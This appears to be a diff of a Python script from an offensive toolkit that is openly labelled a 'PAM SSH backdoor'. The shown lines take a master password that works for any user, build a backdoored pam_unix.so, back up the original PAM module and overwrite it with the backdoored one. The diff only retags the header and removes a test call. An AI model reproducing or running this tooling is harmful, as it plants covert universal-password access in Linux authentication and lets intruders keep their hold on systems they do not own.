@@ -1,5 +1,5 @@
 #!/usr/bin/python3
-#PAM SSH backdoor
+#[ONLINE][Backdoor] PAM SSH backdoor
 #PASSWORD,no,Master password for any user
 #PAM_VERSION,no,Set version of PAM if if you know it
 #END
@@ -75,5 +75,3 @@ def main(arguments):
     create_backdoor(arguments[0], path_to_source_code)
     create_backup_of_original_pam(find_original_pam())
     copy_backdoored_pam(path_to_source_code + "/modules/pam_unix/.libs/pam_unix.so", find_original_pam())
-
-main(["", ""])
